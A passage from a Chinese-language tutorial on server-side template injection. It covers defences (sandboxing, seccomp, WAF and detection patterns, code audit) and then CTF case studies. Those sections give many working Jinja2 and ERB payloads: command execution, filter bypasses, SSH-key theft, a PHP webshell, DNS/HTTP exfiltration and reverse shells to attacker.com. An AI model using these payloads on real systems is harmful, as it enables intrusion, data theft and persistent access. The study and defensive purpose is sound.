        with open(context_path, 'w') as f:
            json.dump(context, f)
        
        try:
            # 在隔离的容器中运行
            container = client.containers.run(
                'python:3.9-alpine',
                command=f'python -c "
import json
from jinja2 import Template
with open(\"/data/context.json\") as f:
    ctx = json.load(f)
with open(\"/data/template.html\") as f:
    tmpl = Template(f.read())
print(tmpl.render(**ctx))
"',
                volumes={tmpdir: {'bind': '/data', 'mode': 'ro'}},
                network_mode='none',  # 禁用网络
                mem_limit='64m',      # 限制内存
                cpu_quota=50000,      # 限制CPU
                detach=True,
            )
            
            result = container.wait(timeout=timeout)
            logs = container.logs().decode('utf-8')
            container.remove()
            
            return logs
            
        except Exception as e:
            return f"Sandbox error: {e}"
```

```python
# 使用 seccomp 限制系统调用
import subprocess
import json

# seccomp 配置文件
SECCOMP_PROFILE = {
    "defaultAction": "SCMP_ACT_ERRNO",
    "architectures": ["SCMP_ARCH_X86_64"],
    "syscalls": [
        {
            "names": [
                "read", "write", "open", "close",
                "stat", "fstat", "lstat", "poll",
                "lseek", "mmap", "mprotect", "munmap",
                "brk", "rt_sigaction", "rt_sigprocmask",
                "ioctl", "pread64", "pwrite64", "readv",
                "writev", "access", "pipe", "select",
                "sched_yield", "mremap", "msync", "mincore",
                "madvise", "shmget", "shmat", "shmctl",
                "dup", "dup2", "pause", "nanosleep",
                "getitimer", "alarm", "setitimer", "getpid",
                "sendfile", "socket", "connect", "accept",
                "sendto", "recvfrom", "sendmsg", "recvmsg",
                "shutdown", "bind", "listen", "getsockname",
                "getpeername", "socketpair", "setsockopt",
                "getsockopt", "clone", "fork", "vfork",
                "exit", "wait4", "kill", "uname",
                "semget", "semop", "semctl", "shmdt",
                "msgget", "msgsnd", "msgrcv", "msgctl",
                "fcntl", "flock", "fsync", "fdatasync",
                "truncate", "ftruncate", "getdents",
                "getcwd", "chdir", "fchdir", "rename",
                "mkdir", "rmdir", "creat", "link",
                "unlink", "symlink", "readlink", "chmod",
                "fchmod", "chown", "fchown", "lchown",
                "umask", "gettimeofday", "getrlimit",
                "getrusage", "sysinfo", "times", "ptrace",
                "getuid", "syslog", "getgid", "setuid",
                "setgid", "geteuid", "getegid", "setpgid",
                "getppid", "getpgrp", "setsid", "setreuid",
                "setregid", "getgroups", "setgroups",
                "setresuid", "getresuid", "setresgid",
                "getresgid", "getpgid", "setfsuid",
                "setfsgid", "getsid", "capget", "capset",
                "rt_sigpending", "rt_sigtimedwait",
                "rt_sigqueueinfo", "rt_sigsuspend",
                "sigaltstack", "utime", "mknod", "personality",
                "ustat", "statfs", "fstatfs", "sysfs",
                "getpriority", "setpriority", "sched_setparam",
                "sched_getparam", "sched_setscheduler",
                "sched_getscheduler", "sched_get_priority_max",
                "sched_get_priority_min", "sched_rr_get_interval",
                "mlock", "munlock", "mlockall", "munlockall",
                "vhangup", "modify_ldt", "pivot_root",
                "prctl", "arch_prctl", "adjtimex", "setrlimit",
                "chroot", "sync", "acct", "settimeofday",
                "mount", "umount2", "swapon", "swapoff",
                "reboot", "sethostname", "setdomainname",
                "iopl", "ioperm", "quotactl", "getpmsg",
                "putpmsg", "afs_syscall", "tuxcall",
                "security", "gettid", "readahead", "setxattr",
                "lsetxattr", "fsetxattr", "getxattr",
                "lgetxattr", "fgetxattr", "listxattr",
                "llistxattr", "flistxattr", "removexattr",
                "lremovexattr", "fremovexattr", "tkill",
                "time", "futex", "sched_setaffinity",
                "sched_getaffinity", "set_thread_area",
                "io_setup", "io_destroy", "io_getevents",
                "io_submit", "io_cancel", "get_thread_area",
                "lookup_dcookie", "epoll_create", "epoll_ctl_old",
                "epoll_wait_old", "remap_file_pages",
                "getdents64", "set_tid_address", "restart_syscall",
                "semtimedop", "fadvise64", "timer_create",
                "timer_settime", "timer_gettime", "timer_getoverrun",
                "timer_delete", "clock_settime", "clock_gettime",
                "clock_getres", "clock_nanosleep", "exit_group",
                "epoll_wait", "epoll_ctl", "tgkill", "utimes",
                "vserver", "mbind", "set_mempolicy", "get_mempolicy",
                "mq_open", "mq_unlink", "mq_timedsend",
                "mq_timedreceive", "mq_notify", "mq_getsetattr",
                "kexec_load", "waitid", "add_key", "request_key",
                "keyctl", "ioprio_set", "ioprio_get", "inotify_init",
                "inotify_add_watch", "inotify_rm_watch", "migrate_pages",
                "openat", "mkdirat", "mknodat", "fchownat",
                "futimesat", "newfstatat", "unlinkat", "renameat",
                "linkat", "symlinkat", "readlinkat", "fchmodat",
                "faccessat", "pselect6", "ppoll", "unshare",
                "set_robust_list", "get_robust_list", "splice",
                "tee", "sync_file_range", "vmsplice", "move_pages",
                "utimensat", "epoll_pwait", "signalfd", "timerfd_create",
                "eventfd", "fallocate", "timerfd_settime",
                "timerfd_gettime", "accept4", "signalfd4", "eventfd2",
                "epoll_create1", "dup3", "pipe2", "inotify_init1",
                "preadv", "pwritev", "rt_tgsigqueueinfo",
                "perf_event_open", "recvmmsg", "fanotify_init",
                "fanotify_mark", "prlimit64", "name_to_handle_at",
                "open_by_handle_at", "clock_adjtime", "syncfs",
                "sendmmsg", "setns", "getcpu", "process_vm_readv",
                "process_vm_writev", "kcmp", "finit_module"
            ],
            "action": "SCMP_ACT_ALLOW"
        }
    ]
}

def run_with_seccomp(command):
    """
    使用 seccomp 限制系统调用运行命令
    """
    # 保存 seccomp 配置
    with tempfile.NamedTemporaryFile(mode='w', suffix='.json', delete=False) as f:
        json.dump(SECCOMP_PROFILE, f)
        seccomp_file = f.name
    
    try:
        result = subprocess.run(
            ['docker', 'run', '--rm', 
             '--security-opt', f'seccomp={seccomp_file}',
             'python:3.9-alpine', 'python', '-c', command],
            capture_output=True,
            text=True,
            timeout=10
        )
        return result.stdout, result.stderr
    finally:
        os.unlink(seccomp_file)
```

---

### 其他安全措施

#### 最小权限原则

```python
# 以低权限用户运行应用
import os
import pwd
import grp

def drop_privileges(user='nobody', group='nogroup'):
    """
    降低进程权限
    """
    if os.getuid() != 0:
        # 不是root用户，无法降权
        return
    
    # 获取目标用户和组的ID
    target_uid = pwd.getpwnam(user).pw_uid
    target_gid = grp.getgrnam(group).gr_gid
    
    # 先设置组ID
    os.setgid(target_gid)
    
    # 删除补充组
    os.setgroups([])
    
    # 设置用户ID
    os.setuid(target_uid)
    
    # 验证权限已降低
    if os.getuid() == 0 or os.geteuid() == 0:
        raise RuntimeError("Failed to drop privileges")

# 在应用启动时调用
drop_privileges('www-data', 'www-data')
```

```dockerfile
# Dockerfile - 使用非root用户运行
FROM python:3.9-slim

# 创建非root用户
RUN groupadd -r appgroup && useradd -r -g appgroup appuser

# 设置工作目录
WORKDIR /app

# 复制依赖并安装
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# 复制应用代码
COPY . .

# 更改文件所有者
RUN chown -R appuser:appgroup /app

# 切换到非root用户
USER appuser

# 暴露端口
EXPOSE 5000

# 运行应用
CMD ["python", "app.py"]
```

```yaml
# Kubernetes - 安全配置
apiVersion: v1
kind: Pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    runAsGroup: 1000
    fsGroup: 1000
  containers:
  - name: webapp
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities:
        drop:
        - ALL
    resources:
      limits:
        cpu: "500m"
        memory: "256Mi"
      requests:
        cpu: "100m"
        memory: "128Mi"
```

#### 日志监控

```python
# 模板注入检测和日志记录
import logging
import re
from functools import wraps
from flask import request

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('security.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger('SSTI_Detector')

# SSTI 检测模式
SSTI_PATTERNS = [
    r'\{\{.*?\}\}',
    r'\{%.*?%\}',
    r'\$\{.*?\}',
    r'\#\{.*?\}',
    r'<\%=.*?\%>',
    r'__class__',
    r'__bases__',
    r'__subclasses__',
    r'__globals__',
    r'__builtins__',
    r'eval\s*\(',
    r'exec\s*\(',
]

class SSTIDetector:
    def __init__(self):
        self.patterns = [re.compile(p, re.IGNORECASE) for p in SSTI_PATTERNS]
    
    def detect(self, data):
        """
        检测潜在的SSTI攻击
        """
        if not data:
            return False, []
        
        matches = []
        for pattern in self.patterns:
            if pattern.search(str(data)):
                matches.append(pattern.pattern)
        
        return len(matches) > 0, matches
    
    def log_attack(self, request_info, matches):
        """
        记录检测到的攻击
        """
        logger.warning(f"Potential SSTI attack detected!")
        logger.warning(f"Source IP: {request_info.get('remote_addr')}")
        logger.warning(f"URL: {request_info.get('url')}")
        logger.warning(f"Method: {request_info.get('method')}")
        logger.warning(f"User-Agent: {request_info.get('user_agent')}")
        logger.warning(f"Matched patterns: {matches}")

detector = SSTIDetector()

def ssti_protection(f):
    """
    装饰器：保护路由免受SSTI攻击
    """
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # 检查所有请求参数
        all_params = {}
        all_params.update(request.args.to_dict())
        all_params.update(request.form.to_dict())
        
        for key, value in all_params.items():
            is_attack, matches = detector.detect(value)
            if is_attack:
                request_info = {
                    'remote_addr': request.remote_addr,
                    'url': request.url,
                    'method': request.method,
                    'user_agent': request.user_agent.string
                }
                detector.log_attack(request_info, matches)
                return {"error": "Potential security threat detected"}, 403
        
        return f(*args, **kwargs)
    return decorated_function

# 使用示例
@app.route('/render', methods=['POST'])
@ssti_protection
def render_template():
    name = request.form.get('name', '')
    return render_template_string('Hello {{ name }}', name=name)
```

```python
# 集成 WAF 规则
class WAFRule:
    def __init__(self, name, pattern, severity, action):
        self.name = name
        self.pattern = re.compile(pattern, re.IGNORECASE)
        self.severity = severity
        self.action = action

class TemplateWAF:
    RULES = [
        WAFRule(
            'Jinja2 Expression',
            r'\{\{[\s\S]*?(?:__class__|__bases__|__subclasses__|__globals__|__builtins__|eval|exec|import|popen|system)[\s\S]*?\}\}',
            'CRITICAL',
            'BLOCK'
        ),
        WAFRule(
            'Twig Expression',
            r'\{\{[\s\S]*?(?:_self|app\.request|app\.session)[\s\S]*?\}\}',
            'HIGH',
            'BLOCK'
        ),
        WAFRule(
            'FreeMarker Expression',
            r'\$\{[\s\S]*?(?:Execute|ObjectConstructor|freemarker)[\s\S]*?\}',
            'CRITICAL',
            'BLOCK'
        ),
        WAFRule(
            'Velocity Expression',
            r'\$\{[\s\S]*?(?:Runtime|ProcessBuilder|getRuntime)[\s\S]*?\}',
            'CRITICAL',
            'BLOCK'
        ),
        WAFRule(
            'ERB Expression',
            r'<%=[\s\S]*?(?:system|exec|eval|`)[\s\S]*?%>',
            'CRITICAL',
            'BLOCK'
        ),
    ]
    
    def inspect(self, request_data):
        for rule in self.RULES:
            if rule.pattern.search(str(request_data)):
                return {
                    'blocked': True,
                    'rule': rule.name,
                    'severity': rule.severity,
                    'action': rule.action
                }
        return {'blocked': False}
```

#### 安全审计

```python
# 自动化安全审计脚本
import ast
import os
from pathlib import Path

class SSTIAudit:
    """
    自动审计代码中的SSTI漏洞
    """
    
    DANGEROUS_PATTERNS = {
        'render_template_string': 'HIGH',
        'Template': 'MEDIUM',
        'from_string': 'MEDIUM',
        'render_string': 'HIGH',
        'render_template': 'LOW',
        'render': 'LOW',
    }
    
    def __init__(self, project_path):
        self.project_path = Path(project_path)
        self.findings = []
    
    def audit_file(self, file_path):
        """
        审计单个Python文件
        """
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            
            tree = ast.parse(content)
            
            for node in ast.walk(tree):
                # 检查函数调用
                if isinstance(node, ast.Call):
                    if isinstance(node.func, ast.Name):
                        func_name = node.func.id
                        if func_name in self.DANGEROUS_PATTERNS:
                            self.findings.append({
                                'file': str(file_path),
                                'line': node.lineno,
                                'type': 'Dangerous Function Call',
                                'function': func_name,
                                'severity': self.DANGEROUS_PATTERNS[func_name],
                                'recommendation': self.get_recommendation(func_name)
                            })
                
                # 检查字符串格式化
                if isinstance(node, ast.JoinedStr):
                    self.findings.append({
                        'file': str(file_path),
                        'line': node.lineno,
                        'type': 'F-string in Template',
                        'severity': 'MEDIUM',
                        'recommendation': 'Avoid using f-strings with template content'
                    })
            
            # 检查原始文本中的危险模式
            lines = content.split('\n')
            for i, line in enumerate(lines, 1):
                if 'render_template_string' in line and ('f"' in line or "f'" in line or '.format(' in line):
                    self.findings.append({
                        'file': str(file_path),
                        'line': i,
                        'type': 'Dynamic Template Construction',
                        'severity': 'CRITICAL',
                        'recommendation': 'Never use render_template_string with dynamic content'
                    })
                    
        except Exception as e:
            print(f"Error auditing {file_path}: {e}")
    
    def get_recommendation(self, func_name):
        recommendations = {
            'render_template_string': 'Use render_template with static template files instead',
            'Template': 'Ensure template content is not user-controlled',
            'from_string': 'Validate template content before parsing',
            'render_string': 'Use render_template with static template files instead',
            'render_template': 'Ensure context variables are sanitized',
            'render': 'Ensure context variables are sanitized',
        }
        return recommendations.get(func_name, 'Review this function call')
    
    def run_audit(self):
        """
        运行完整审计
        """
        for py_file in self.project_path.rglob('*.py'):
            if 'venv' not in str(py_file) and '__pycache__' not in str(py_file):
                self.audit_file(py_file)
        
        return self.findings
    
    def generate_report(self):
        """
        生成审计报告
        """
        report = []
        report.append("=" * 80)
        report.append("SSTI Security Audit Report")
        report.append("=" * 80)
        report.append(f"Total Findings: {len(self.findings)}")
        report.append("")
        
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        for finding in self.findings:
            severity_counts[finding['severity']] += 1
        
        report.append("Severity Summary:")
        for sev, count in severity_counts.items():
            report.append(f"  {sev}: {count}")
        report.append("")
        
        for finding in self.findings:
            report.append("-" * 80)
            report.append(f"File: {finding['file']}")
            report.append(f"Line: {finding['line']}")
            report.append(f"Type: {finding['type']}")
            report.append(f"Severity: {finding['severity']}")
            if 'function' in finding:
                report.append(f"Function: {finding['function']}")
            report.append(f"Recommendation: {finding['recommendation']}")
            report.append("")
        
        return '\n'.join(report)

# 使用示例
if __name__ == '__main__':
    auditor = SSTIAudit('./my_project')
    auditor.run_audit()
    print(auditor.generate_report())
```

```yaml
# CI/CD 安全扫描配置示例（GitHub Actions）
name: Security Audit

on: [push, pull_request]

jobs:
  ssti-scan:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    
    - name: Set up Python
      uses: actions/setup-python@v2
      with:
        python-version: '3.9'
    
    - name: Install dependencies
      run: |
        pip install bandit semgrep
    
    - name: Run Bandit security scan
      run: |
        bandit -r . -f json -o bandit-report.json || true
    
    - name: Run Semgrep SSTI rules
      run: |
        semgrep --config=p/security-audit --json --output=semgrep-report.json .
    
    - name: Upload scan results
      uses: actions/upload-artifact@v2
      with:
        name: security-reports
        path: |
          bandit-report.json
          semgrep-report.json
```

---

### 防御措施总结

| 防御层级 | 措施 | 优先级 |
|---------|------|--------|
| 输入层 | 白名单验证、黑名单过滤、长度限制 | 高 |
| 应用层 | 使用安全API、避免动态模板、参数化查询 | 高 |
| 模板层 | 沙箱配置、禁用危险函数、自动转义 | 高 |
| 系统层 | 最小权限、资源限制、网络隔离 | 中 |
| 监控层 | 日志记录、WAF规则、异常检测 | 中 |
| 审计层 | 代码审计、依赖扫描、渗透测试 | 低 |

---

## CTF实战案例

### 案例1：攻防世界 - Web_python_template_injection

#### 题目描述

这是一道经典的Python Flask SSTI题目，题目页面提供了一个简单的输入框，提示用户可以输入名字进行问候。

**题目特点**：
- 基于Flask框架开发
- 使用Jinja2模板引擎
- 用户输入直接拼接到模板中渲染
- 目标：读取服务器上的flag文件

**题目界面示例**：
```
URL: http://challenge-server/?name=test
返回: Hello test
```

#### 解题思路

**第一步：探测SSTI漏洞**

首先确认是否存在模板注入漏洞，通过输入数学表达式测试：

```
?name={{7*7}}
```

如果页面返回`Hello 49`，说明存在SSTI漏洞。

**第二步：确认模板引擎类型**

```
?name={{7*'7'}}
```

- 如果返回`Hello 7777777`（7个7），说明是Python/Jinja2
- 如果返回`Hello 49`，说明可能是PHP/Twig

**第三步：构造利用链获取flag**

利用Python的MRO（方法解析顺序）机制，通过`__class__` -> `__bases__` -> `__subclasses__`链找到可以执行命令的类。

#### 完整Payload

**Payload 1：基础命令执行**

```python
# 读取/etc/passwd验证
?name={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat /etc/passwd').read()}}

# 获取flag
?name={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat /flag').read()}}
```

**Payload 2：使用__builtins__**

```python
?name={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['open']('/flag').read()}}
```

**Payload 3：使用subprocess模块**

```python
?name={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('subprocess').check_output('cat /flag',shell=True)}}
```

**Payload 4：查找子类索引（自动化）**

```python
# 先列出所有子类，找到os._wrap_close的索引
?name={{().__class__.__bases__[0].__subclasses__()}}

# 然后使用正确的索引执行命令
?name={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('ls').read()}}
```

#### 关键技巧

**技巧1：确定正确的子类索引**

不同Python版本的子类索引可能不同，可以使用以下方法查找：

```python
# 列出所有子类并查找包含popen的类
?name={{%27%27.__class__.__mro__[1].__subclasses__()}}

# 或者使用循环查找（如果模板支持）
?name={%20for%20c%20in%20[].__class__.__base__.__subclasses__()%20%}{%%20if%20c.__name__%20==%20%27catch_warnings%27%20%}{{c.__init__.__globals__[%27__builtins__%27].open(%27/etc/passwd%27).read()}}{%%20endif%20%}{%%20endfor%20%}
```

**技巧2：使用lipsum对象（Flask内置）**

```python
# lipsum是Flask模板中内置的对象，可以直接获取globals
?name={{lipsum.__globals__['os'].popen('cat /flag').read()}}

# 或者
?name={{lipsum.__globals__['__builtins__']['open']('/flag').read()}}
```

**技巧3：使用request对象**

```python
# 通过request对象获取应用上下文
?name={{request.application.__globals__['__builtins__']['open']('/flag').read()}}
```

**技巧4：使用config对象**

```python
# 获取配置信息后，通过其__class__链执行命令
?name={{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```

**技巧5：URL编码绕过空格过滤**

```
# 空格可以用+或%20代替
?name={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat%20/flag').read()}}
```

---

### 案例2：BUUCTF - SSTI系列题目

#### 题目分析

BUUCTF平台有多道SSTI题目，难度逐渐递增，涉及各种绕过技巧。

**题目类型**：
1. **基础SSTI**：无过滤，直接利用
2. **关键词过滤**：过滤`__class__`、`__bases__`等
3. **字符过滤**：过滤`.`、`[`、`]`等字符
4. **长度限制**：限制Payload长度
5. **无回显SSTI**：命令执行结果不显示在页面

#### 绕过技巧

**绕过技巧1：使用attr过滤器**

当`__class__`等关键词被过滤时：

```python
# 原始Payload
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('whoami').read()}}

# 使用attr过滤器绕过
{{()|attr('__class__')|attr('__bases__')|attr('__getitem__')(0)|attr('__subclasses__')()|attr('__getitem__')(137)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('whoami')|attr('read')()}}
```

**绕过技巧2：字符串拼接**

```python
# 使用+拼接
{{()['__cl'+'ass__'].__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('whoami').read()}}

# 使用join
{{()|attr(['__cl','ass__']|join)|attr('__bases__')|attr('__getitem__')(0)|attr('__subclasses__')()|attr('__getitem__')(137)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('whoami')|attr('read')()}}

# 使用format
{{()|attr('__cl{0}ss__'.format('a'))}}
```

**绕过技巧3：使用request对象绕过**

```python
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('cat /flag')|attr('read')()}}
```

**绕过技巧4：使用Unicode/编码绕过**

```python
# Unicode编码
{{()|attr('\x5f\x5fclass\x5f\x5f')}}

# 使用chr构造（需要找到chr函数）
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['chr']}}
```

**绕过技巧5：使用十六进制编码绕过字符过滤**

```python
# 如果.被过滤，可以使用__getitem__代替
{{().__class__.__bases__[0]}}  # 可以写成
{{().__class__['__bases__'][0]}}

# 如果[]被过滤，可以使用__getitem__
{{().__class__.__bases__.__getitem__(0)}}
```

#### 解题过程

**BUUCTF [SSTI] 基础题**

```python
# 步骤1：探测
?name={{7*7}}  # 返回49，确认漏洞

# 步骤2：获取flag
?name={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat /flag').read()}}
```

**BUUCTF [SSTI] 过滤下划线**

```python
# 使用request对象绕过下划线过滤
?name={{request[request.args.class][request.args.bases][0][request.args.subclasses]()[137][request.args.init][request.args.globals]['popen']('cat /flag').read()}}&class=__class__&bases=__bases__&subclasses=__subclasses__&init=__init__&globals=__globals__

# 或者使用attr过滤器
?name={{()|attr(request.args.a)|attr(request.args.b)|attr(request.args.c)(0)|attr(request.args.d)()[137]|attr(request.args.e)|attr(request.args.f)|attr(request.args.g)('popen')('cat /flag')|attr(request.args.h)()}}&a=__class__&b=__bases__&c=__getitem__&d=__subclasses__&e=__init__&f=__globals__&g=__getitem__&h=read
```

**BUUCTF [SSTI] 过滤点号**

```python
# 使用attr过滤器代替点号
?name={{()|attr('__class__')|attr('__bases__')|attr('__getitem__')(0)|attr('__subclasses__')()|attr('__getitem__')(137)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen')('cat /flag')|attr('read')()}}

# 或者使用__getitem__
?name={{()['__class__']['__bases__'][0]['__subclasses__']()[137]['__init__']['__globals__']['popen']('cat /flag')['read']()}}
```

**BUUCTF [SSTI] 无回显**

```python
# 使用DNS外带
?name={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('curl http://`cat /flag`.your-dns-server.com').read()}}

# 或者使用HTTP外带
?name={{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://your-server/?flag='+open('/flag').read()).read()}}
```

**BUUCTF [SSTI] 长度限制**

```python
# 使用短Payload
?name={{lipsum.__globals__['os'].popen('cat /flag').read()}}

# 或者分步执行
?name={%set a=lipsum%}{%set b=a.__globals__%}{%set c=b['os']%}{%set d=c.popen('cat /flag')%}{{d.read()}}
```

---

### 案例3：实际漏洞案例

#### 真实漏洞场景

**场景1：邮件模板系统的SSTI漏洞**

某企业邮件营销系统允许用户自定义邮件模板，用户可以插入变量如`{{username}}`、`{{email}}`等。由于未对用户输入进行过滤，导致SSTI漏洞。

**漏洞代码示例**：
```python
from flask import Flask, request
from jinja2 import Template

app = Flask(__name__)

@app.route('/send_email', methods=['POST'])
def send_email():
    template_str = request.form.get('template')
    user_data = {
        'username': request.form.get('username'),
        'email': request.form.get('email')
    }
    # 危险！直接使用用户输入作为模板
    template = Template(template_str)
    email_content = template.render(**user_data)
    # 发送邮件...
    return email_content
```

**利用方法**：
```python
# 攻击者在模板中输入
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat /etc/passwd').read()}}

# 或者读取配置文件
{{config}}

# 获取环境变量
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('os').environ}}
```

**场景2：报表生成系统的SSTI漏洞**

某数据分析平台的报表功能允许用户使用模板语法自定义报表格式，攻击者利用此功能执行系统命令。

**漏洞代码示例**：
```python
@app.route('/generate_report')
def generate_report():
    report_template = request.args.get('template')
    data = get_report_data()
    # 危险！动态渲染用户提供的模板
    return render_template_string(report_template, data=data)
```

**场景3：CMS主题编辑器的SSTI漏洞**

某内容管理系统的主题编辑器允许用户编辑模板文件，未对模板语法进行限制，导致攻击者可以通过编辑模板获取服务器权限。

#### 利用方法

**信息收集阶段**：

```python
# 1. 获取系统信息
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('uname -a').read()}}

# 2. 获取当前用户
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('whoami').read()}}

# 3. 获取环境变量
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['__builtins__']['__import__']('os').environ}}

# 4. 获取网络配置
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('ifconfig').read()}}
```

**权限提升阶段**：

```python
# 1. 查找敏感文件
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('find / -name "*.conf" -o -name "*.config" 2>/dev/null').read()}}

# 2. 读取SSH私钥
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat ~/.ssh/id_rsa').read()}}

# 3. 查看计划任务
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('cat /etc/crontab').read()}}
```

**持久化阶段**：

```python
# 1. 写入WebShell
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('echo "<?php system($_GET[\'cmd\']);?>" > /var/www/html/shell.php').read()}}

# 2. 添加SSH公钥
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys').read()}}

# 3. 反弹Shell
{{().__class__.__bases__[0].__subclasses__()[137].__init__.__globals__['popen']('bash -i >& /dev/tcp/attacker.com/4444 0>&1').read()}}
```

#### 修复建议

**1. 使用静态模板，避免动态渲染**

```python
# 不安全
@app.route('/unsafe')
def unsafe():
    user_template = request.args.get('template')
    return render_template_string(user_template, name="test")

# 安全
@app.route('/safe')
def safe():
    name = request.args.get('name', '')
    # 使用预定义的模板文件
    return render_template('greeting.html', name=name)
```

**2. 使用沙箱环境**

```python
from jinja2.sandbox import SandboxedEnvironment

env = SandboxedEnvironment()
template = env.from_string('Hello {{ name }}')
result = template.render(name=user_input)
```

**3. 严格输入验证**

```python
import re

def validate_template_input(user_input):
    # 白名单验证，只允许特定字符
    if not re.match(r'^[a-zA-Z0-9_\s\-\.]+$', user_input):
        return False
    
    # 黑名单过滤危险关键字
    dangerous_keywords = ['__class__', '__bases__', '__subclasses__', 
                          '__init__', '__globals__', 'eval', 'exec', 
                          'open', 'popen', 'system', 'subprocess']
    for keyword in dangerous_keywords:
        if keyword in user_input:
            return False
    return True
```

**4. 使用Autoescape**

```python
from jinja2 import Environment, select_autoescape

env = Environment(autoescape=select_autoescape(['html', 'xml']))
```

**5. 最小权限原则**

- 应用服务以低权限用户运行（如www-data、nginx）
- 限制模板目录的访问权限
- 使用chroot或容器隔离应用

**6. 安全配置示例**

```python
from flask import Flask
from jinja2 import Environment, FileSystemLoader, select_autoescape

app = Flask(__name__)

# 配置安全头部
@app.after_request
def set_security_headers(response):
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['Content-Security-Policy'] = "default-src 'self'"
    return response

# 使用安全的模板配置
app.jinja_env.autoescape = True
app.jinja_env.sandboxed = True

# 禁用危险的全局函数
app.jinja_env.globals.clear()
```

**7. 安全审计建议**

- 定期使用静态代码分析工具扫描模板相关代码
- 对模板功能进行渗透测试
- 监控异常模板渲染行为
- 记录模板渲染日志以便审计

---

### CTF SSTI 解题总结

**通用解题流程**：

1. **探测阶段**：使用`{{7*7}}`等Payload确认漏洞存在
2. **识别阶段**：确定模板引擎类型（Jinja2、Twig、Smarty等）
3. **信息收集**：获取配置信息、环境变量等
4. **利用阶段**：构造Payload执行命令或读取文件
5. **绕过阶段**：如有过滤，使用各种绕过技巧

**常用工具**：

```bash
# 使用Tplmap自动化检测
python tplmap.py -u "http://target.com/page?name=test"

# 使用Burp Suite插件
# SSTI Scanner插件可以自动检测和验证SSTI

# 手动测试Payload列表
payloads = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "${{7*7}}",
    "#{7*7}",
    "*{7*7}",
    "@{7*7}",
    "[[7*7]]",
]
```

**注意事项**：

1. 不同Python版本的`__subclasses__()`索引可能不同
2. 某些环境可能禁用了`os`、`subprocess`等模块
3. 无回显情况下需要使用外带技术（DNS、HTTP）
4. 长度限制时需要构造精简Payload
5. WAF可能拦截常见Payload，需要变形绕过

---

## 其他模板引擎

### Ruby ERB

ERB（Embedded Ruby）是Ruby标准库中的模板引擎，允许在文本中嵌入Ruby代码。

#### ERB基础语法

```erb
<!-- 变量输出 -->
<%= @username %>

<!-- 执行Ruby代码（无输出） -->
<% user = User.find(1) %>

<!-- 条件判断 -->
<% if user.admin? %>
  <p>欢迎管理员</p>
<% else %>
  <p>欢迎普通用户</p>
<% end %>

<!-- 循环遍历 -->
<% @users.each do |user| %>
  <p><%= user.name %></p>
<% end %>
```

#### SSTI Payload示例

**基础探测：**

```erb
<%= 7*7 %>
<%= system('whoami') %>
```

**执行系统命令：**

```erb
<%= `whoami` %>
<%= system('cat /etc/passwd') %>
<%= exec('id') %>
<%= %x{ls -la} %>
```

**读取文件：**

```erb
<%= File.open('/etc/passwd').read %>
<%= IO.read('/flag.txt') %>
<%= open('/etc/passwd').read %>
```

**反向Shell：**

```erb
<%= system('bash -i >& /dev/tcp/attacker.com/4444 0>&1') %>
```

#### <%= %>标签利用

**代码执行：**

```erb
<%= eval("system('whoami')") %>
<%= eval(params[:cmd]) %>
```

**对象方法调用：**

```erb
<%= Object.const_get('Kernel').send(:system, 'whoami') %>
<%= Kernel.exec('sh') %>
```

**利用Rails环境：**

```erb
<%= Rails.application.secrets.secret_key_base %>
<%= ENV['DATABASE_PASSWORD'] %>
<%= User.first.password %>
```

**加载外部代码：**

```erb
<%= require 'net/http'; Net::HTTP.get(URI('http://attacker.com/shell.rb')) %>
<%= load '/tmp/malicious.rb' %>
```

---

### Node.js模板引擎

Node.js生态中有多种模板引擎，其中一些存在SSTI风险。

#### Handlebars简介和Payload

Handlebars是一个逻辑less的模板引擎，但某些版本存在原型链污染导致的RCE。

**基础语法：**

```handlebars
